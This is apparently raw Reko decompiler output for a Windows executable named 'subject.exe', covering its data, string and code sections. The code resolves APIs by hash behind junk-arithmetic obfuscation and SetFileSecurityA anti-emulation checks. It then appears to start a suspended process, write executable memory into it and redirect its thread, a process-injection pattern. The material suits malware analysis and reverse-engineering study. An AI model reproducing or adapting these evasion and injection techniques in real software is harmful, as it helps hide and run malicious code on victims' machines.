// subject_data.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

word32 g_dw404000 = 0x0040311C; // 00404000
Eq_9 g_t404008 = &g_str40310A; // 00404008
word32 g_dw40400C = 0x00403106; // 0040400C
uint32 g_dw404010 = 0x004030FA; // 00404010
word32 g_dw404018 = 0x004030F4; // 00404018
word32 g_dw40401C = 0x004030EF; // 0040401C
word32 g_dw404038 = 0x004030BD; // 00404038
word32 g_dw40403C = 0x004030BA; // 0040403C
word32 g_dw404098 = 0x40F8; // 00404098
word32 g_dw40409C = 0x4108; // 0040409C
word32 g_dw4040A0 = 0x411E; // 004040A0
word32 g_dw4040A4 = 16690; // 004040A4
word32 g_dw4040A8 = 0x4140; // 004040A8
word32 g_dw4040AC = 16716; // 004040AC
word32 g_dw4040B0 = 0x415A; // 004040B0
word32 g_dw4040B4 = 0x416C; // 004040B4
word32 g_dw4040B8 = 0x41AA; // 004040B8
word32 g_dw4040C0 = 16776; // 004040C0
<anonymous> * __imp__LoadLibraryA = &g_t40F8; // 004040C8
<anonymous> * __imp__GetModuleFileNameA = &g_t4108; // 004040CC
<anonymous> * __imp__GetModuleHandleA = &g_t411E; // 004040D0
<anonymous> * __imp__CreateFileA = &g_t4132; // 004040D4
<anonymous> * __imp__WriteFile = &g_t4140; // 004040D8
<anonymous> * __imp__CloseHandle = &g_t414C; // 004040DC
<anonymous> * __imp__GetCommandLineA = &g_t415A; // 004040E0
<anonymous> * __imp__ExitProcess = &g_t416C; // 004040E4
<anonymous> * __imp__RtlUnwind = &g_t41AA; // 004040E8
<anonymous> * __imp__SetFileSecurityA = &g_t4188; // 004040F0
<anonymous> * g_ptr4041B8 = null; // 004041B8
<anonymous> * g_ptr4041BC = null; // 004041BC
<anonymous> * g_ptr4041C0 = null; // 004041C0
<anonymous> * g_ptr4041C4 = null; // 004041C4
<anonymous> * g_ptr4041C8 = null; // 004041C8
<anonymous> * g_ptr4041CC = null; // 004041CC
<anonymous> * g_ptr4041D0 = null; // 004041D0
<anonymous> * g_ptr4041D4 = null; // 004041D4
<anonymous> * g_ptr4041D8 = null; // 004041D8
<anonymous> * g_ptr4041DC = null; // 004041DC
<anonymous> * g_ptr4041E0 = null; // 004041E0
<anonymous> * g_ptr4041E4 = null; // 004041E4
<anonymous> * g_ptr4041E8 = null; // 004041E8
<anonymous> * g_ptr4041EC = null; // 004041EC
<anonymous> * g_ptr4041F0 = null; // 004041F0
<anonymous> * g_ptr4041F4 = null; // 004041F4
<anonymous> * g_ptr4041F8 = null; // 004041F8
<anonymous> * g_ptr4041FC = null; // 004041FC
<anonymous> * g_ptr404200 = null; // 00404200
<anonymous> * g_ptr404204 = null; // 00404204
<anonymous> * g_ptr404208 = null; // 00404208
CHAR g_t40420C = '\0'; // 0040420C
word32 g_dw404414 = 0x00; // 00404414
word32 g_dw404440 = 0x00; // 00404440
word16 g_w404444 = 0x00; // 00404444
word32 g_dw404458 = 0x00; // 00404458
word32 g_dw40445C = 0x00; // 0040445C
word32 g_dw404468 = 0x00; // 00404468
word32 g_dw404520 = 0x00; // 00404520
// subject_rdata.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

CHAR g_str40310A[] = "kernel32.dll"; // 0040310A
// subject_text.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 0040100B: Register Eq_2 Win32CrtStartup()
Eq_2 Win32CrtStartup()
{
	ptr32 fp;
	ui32 dwLoc10;
	ui32 dwLoc08;
	Eq_6 eax_18 = LoadLibraryA(g_t404008);
	g_ptr4041B8 = fn004014B0(eax_18, 0x647503D7);
	g_ptr4041BC = fn004014B0(eax_18, 3103470006);
	ui32 eax_25 = dwLoc10 + 0x05B5 | dwLoc08 * 0x02 + 220;
	g_ptr4041C0 = fn004014B0(eax_18, ~0x49CE628E);
	g_ptr4041C4 = fn004014B0(eax_18, 2287583851);
	ui32 eax_50 = dwLoc10 + 5577 + eax_25 * 0x02 | eax_25 * 0x02 + 0x94;
	g_ptr4041C8 = fn004014B0(eax_18, 0x8859EA6B);
	g_ptr4041CC = fn004014B0(eax_18, 4103878185);
	g_ptr4041D0 = fn004014B0(eax_18, 2252249024);
	ui32 eax_76 = dwLoc10 * 0x02 | eax_50 + 0x26 ^ (eax_50 * 0x02 ^ dwLoc10 * 0x02);
	g_ptr4041D4 = fn004014B0(eax_18, 445514251);
	ui32 eax_124 = ~0x0A38 - dwLoc10 ^ eax_76 * 0x02;
	g_ptr4041D8 = fn004014B0(eax_18, 1203243316);
	g_ptr4041DC = fn004014B0(eax_18, 1992264094);
	g_ptr4041E0 = fn004014B0(eax_18, 1992019742);
	ui32 eax_195 = eax_76 * 0x08 + eax_124;
	g_ptr4041E4 = fn004014B0(eax_18, 2002683038);
	ui32 eax_227 = (eax_195 + 0x03C1) * 0x02 + 7141 << ((byte) eax_195 + 0xC1) * 0x02 + 0x09 ^ eax_124 * 0x02 >> 0x90;
	g_ptr4041E8 = fn004014B0(eax_18, 1730943013);
	g_ptr4041EC = fn004014B0(eax_18, 78561712);
	ui32 eax_302 = eax_124 * 0x02 ^ (eax_227 * 0x02 + 0x0255) + eax_124 * 0x02 << (byte) eax_124 * 0x02 + 161;
	g_ptr4041F0 = fn004014B0(eax_18, 0x0EEED9CD);
	word32 eax_348 = ~0x0AC3 - eax_302 * 0x04;
	ui32 eax_325 = eax_302 * 0x02 + 0xD9 | eax_227 * 0x04 + 0x1B7F;
	struct Eq_181 * esp_399;
	g_ptr4041E0();
	Eq_183 eax_376 = eax_325 + 2121 << ((byte) eax_348 << 0x03) >> (byte) eax_348 * 0x02 + 0x4C;
	int32 ecx_407 = eax_376 * 0x02 + 202;
	esp_399->dwFFFFFFFC = g_dw40403C;
	esp_399->ptrFFFFFFF8 = fp - 48;
	int32 edx_408 = ((word32) eax_376 + 4946) *s ecx_407;
	struct Eq_215 * esp_421;
	g_ptr4041DC();
	esp_421->dwFFFFFFFC = g_dw404018;
	esp_421->ptrFFFFFFF8 = fp - 48;
	ui32 eax_410 = (word32) eax_376 + 0x0546 & edx_408;
	struct Eq_231 * esp_448;
	g_ptr4041DC();
	esp_448->dwFFFFFFFC = g_dw40400C;
	esp_448->ptrFFFFFFF8 = fp - 48;
	ui32 ecx_458 = eax_325 + 0x2240 & eax_410 * 0x02;
	struct Eq_249 * esp_472;
	g_ptr4041DC();
	esp_472->ptrFFFFFFFC = fp - 48;
	ui32 eax_461 = (eax_325 + eax_410) * 0x02 + 1751 | ecx_458;
	struct Eq_263 * esp_494;
	Eq_6 eax_495;
	g_ptr4041D8();
	esp_494->dwFFFFFFFC = 0x74D8B47E;
	esp_494->tFFFFFFF8 = eax_495;
	g_ptr4041F4 = fn004014B0(esp_494->tFFFFFFF8, esp_494->dwFFFFFFFC);
	esp_494->dwFFFFFFFC = 2182984901;
	esp_494->tFFFFFFF8 = eax_495;
	g_ptr4041F8 = fn004014B0(esp_494->tFFFFFFF8, esp_494->dwFFFFFFFC);
	esp_494->dwFFFFFFFC = 0x9A399F22;
	esp_494->tFFFFFFF8 = eax_495;
	g_ptr4041FC = fn004014B0(esp_494->tFFFFFFF8, esp_494->dwFFFFFFFC);
	esp_494->dwFFFFFFFC = 946146086;
	esp_494->tFFFFFFF8 = eax_495;
	g_ptr404200 = fn004014B0(esp_494->tFFFFFFF8, esp_494->dwFFFFFFFC);
	esp_494->dwFFFFFFFC = 998627677;
	esp_494->tFFFFFFF8 = eax_495;
	g_ptr404204 = fn004014B0(esp_494->tFFFFFFF8, esp_494->dwFFFFFFFC);
	ui32 eax_570 = eax_461 * 0x04 + 0x57;
	Eq_356 eax_596 = eax_570 * 0x02 - (eax_570 * 0x02) *s 0x00 >> (byte) eax_461 * 0x02 + 0x2F;
	esp_494->dwFFFFFFFC = g_dw404010;
	int32 ecx_617 = eax_570 * 0x02 *s eax_596;
	ui32 eax_621 = eax_570 * 0x02 + ecx_617 * 0x04 | eax_596 * 0x04;
	struct Eq_386 * esp_629;
	Eq_6 eax_630;
	g_ptr4041D8();
	esp_629->dwFFFFFFFC = ~0x22B0BE74;
	esp_629->tFFFFFFF8 = eax_630;
	g_ptr404208 = fn004014B0(esp_629->tFFFFFFF8, esp_629->dwFFFFFFFC);
	fn004016BD();
	ui32 eax_637 = eax_596 * 0x08 + 0x1846;
	esp_629->dwFFFFFFFC = 0x00;
	uint32 eax_666 = eax_621 * 0x02 + 16 >> ((byte) eax_621 * 0x02 + 0x89) *s ((byte) eax_637 * 0x02 + 226) + ((byte) eax_596 * 0x02 + 88);
	g_ptr4041D4();
	return 0x00;
}

// 004014B0: Register word32 fn004014B0(Stack Eq_6 dwArg04, Stack uint32 dwArg08)
// Called from:
//      Win32CrtStartup
word32 fn004014B0(Eq_6 dwArg04, uint32 dwArg08)
{
	ptr32 fp;
	struct Eq_445 * fs;
	ptr32 v6_15 = fs->ptr0000;
	fs->ptr0000 = fp - 20;
	word32 eax_68 = Mem65[Mem45[dwArg04 + 60:word32] + dwArg04 + 0x0078:word32] + dwArg04;
	word16 eax_72[] = dwArg04 + eax_68->dw0024 / 4;
	if (SetFileSecurityA(null, 0x00, null) != 0x00)
		dwArg08 += 31220;
	if (SetFileSecurityA((CHAR *) 666, 0x00, null) == 0x00)
		dwArg08 += 0x000C679D;
	word32 eax_125[] = dwArg04 + eax_68->dw0020 / 4;
	word32 eax_130[] = dwArg04 + eax_68->dw001C / 4;
	int32 esi_132 = 0x00;
	while (true)
	{
		word32 eax_218;
		if (esi_132 >= eax_68->dw0018)
			break;
		uint32 eax_143 = 0x00;
		int32 ecx_160 = dwArg04 + eax_125[esi_132] / 4;
		byte dwLoc3C_292[] = null;
		while (dwLoc3C_292[ecx_160] != 0x00)
		{
			eax_143 = (eax_143 << 0x07 | eax_143 >> 0x19) ^ ((int32) dwLoc3C_292[ecx_160] ^ 0x55);
			dwLoc3C_292 = (byte (*)[]) (dwLoc3C_292 + 1);
		}
		if (eax_143 == dwArg08)
		{
			eax_218 = dwArg04 + eax_130[(word32) eax_72[esi_132]] / 4;
			goto l004016AA;
		}
		++esi_132;
	}
	eax_218 = 0x00;
l004016AA:
	fs->ptr0000 = v6_15;
	return eax_218;
}

// 004016BD: void fn004016BD()
// Called from:
//      Win32CrtStartup
void fn004016BD()
{
	ptr32 fp;
	word32 dwLoc08;
	ui32 dwLoc10;
	int32 dwLoc0C;
	GetModuleFileNameA(null, &g_t40420C, 0x0104);
	ui32 eax_27 = dwLoc08 + 4114 ^ (dwLoc10 * 0x08 + 0x163A & dwLoc08 + 0x107B) & dwLoc0C * 0x02 + 0xCE;
	int32 edx_40 = (eax_27 * 0x04 + 0x22AC) *s dwLoc0C;
	ui32 eax_44 = 0x00 << (byte) edx_40 * 0x02;
	struct Eq_594 * esp_52;
	g_ptr4041E0();
	esp_52->dwFFFFFFFC = g_dw404000;
	esp_52->dwFFFFFFF8 = 0x00404310;
	uint32 eax_65 = eax_27 * 0x02 + 0xA0 >> (byte) dwLoc08 * 0x04;
	struct Eq_614 * esp_73;
	g_ptr4041DC();
	esp_73->dwFFFFFFFC = g_dw40401C;
	esp_73->dwFFFFFFF8 = 0x00404310;
	struct Eq_625 * esp_89;
	g_ptr4041DC();
	esp_89->dwFFFFFFFC = g_dw404038;
	esp_89->dwFFFFFFF8 = 0x00404310;
	uint32 eax_102 = 0 >> (byte) dwLoc08 * 0x02;
	struct Eq_642 * esp_110;
	g_ptr4041DC();
	ui32 ecx_119 = eax_65 * 0x02 + 5158;
	esp_110->dwFFFFFFFC = 4211212;
	esp_110->dwFFFFFFF8 = 0x00404310;
	uint32 edx_121 = 0x00 >> (byte) ecx_119;
	struct Eq_661 * esp_131;
	g_ptr4041DC();
	g_dw404414 = 0x44;
	g_dw404440 = 0x01;
	g_w404444 = 0x02;
	esp_131->dwFFFFFFFC = 0x00404458;
	esp_131->dwFFFFFFF8 = 0x00404414;
	esp_131->dwFFFFFFF4 = 0x00;
	esp_131->dwFFFFFFF0 = 0x00;
	esp_131->dwFFFFFFEC = 0x04;
	esp_131->dwFFFFFFE8 = 0x00;
	esp_131->dwFFFFFFE4 = 0x00;
	esp_131->dwFFFFFFE0 = 0x00;
	esp_131->dwFFFFFFDC = 0x00404310;
	esp_131->dwFFFFFFD8 = 0x00;
	ui32 eax_146 = 0x00 >> (byte) dwLoc08 * 0x04 & eax_102 * 0x02 + 0x1B86;
	struct Eq_723 * esp_183;
	g_ptr4041B8();
	esp_183->tFFFFFFFC = null;
	ui32 eax_212 = eax_146 * 0x04 | (eax_146 * 0x02) *s (eax_146 * 0x02 + 100) << (byte) eax_146 * 0x08;
	Eq_6 eax_198 = GetModuleHandleA(esp_183->tFFFFFFFC);
	word32 eax_223 = eax_198 + Mem221[eax_198 + 60:word32];
	esp_183->tFFFFFFFC = (CHAR *) 0x40;
	esp_183->dwFFFFFFF8 = 0x3000;
	esp_183->dwFFFFFFF4 = (int32) eax_223[20];
	esp_183->tFFFFFFF0 = eax_198;
	esp_183->dwFFFFFFEC = g_dw404458;
	ui32 eax_227 = eax_212 * 0x08 + 0x097F;
	ui32 eax_231 = eax_212 * 0x02 << (byte) eax_227;
	struct Eq_788 * esp_246;
	word32 eax_247;
	g_ptr4041BC();
	ui32 edx_220 = eax_146 * 0x08 & eax_146 * 0x04 & eax_146 * 0x04;
	esp_246->ptrFFFFFFFC = fp - 20;
	esp_246->dwFFFFFFF8 = (int32) eax_223[20];
	esp_246->tFFFFFFF4 = eax_198;
	esp_246->dwFFFFFFF0 = eax_247;
	esp_246->dwFFFFFFEC = g_dw404458;
	ui32 ecx_259 = edx_220 + 0x1036 & eax_212 + 0x0DF6 << (byte) eax_212 * 0x08 + ~0x14;
	struct Eq_833 * esp_281;
	g_ptr4041C0();
	g_dw404468 = 0x00010007;
	esp_281->dwFFFFFFFC = 0x00404468;
	esp_281->dwFFFFFFF8 = g_dw40445C;
	ui32 eax_293 = (ecx_259 + 202 + ((edx_220 * 0x02 + 0x2665) + eax_231 * 0x02)) * 0x02 + 0x0068 << (byte) edx_220 + 122;
	struct Eq_866 * esp_306;
	g_ptr4041C4();
	g_dw404520 = 0x00401D2D;
	esp_306->dwFFFFFFFC = 0x00404468;
	esp_306->dwFFFFFFF8 = g_dw40445C;
	int32 ecx_329 = eax_293 * 0x02 *s ((eax_231 * 0x02 + 0x1541 & 0x02CC) * 0x02);
	ui32 edx_331 = 6556 << (byte) ecx_329;
	struct Eq_895 * esp_343;
	g_ptr4041C8();
	esp_343->dwFFFFFFFC = g_dw40445C;
	g_ptr4041CC();
}

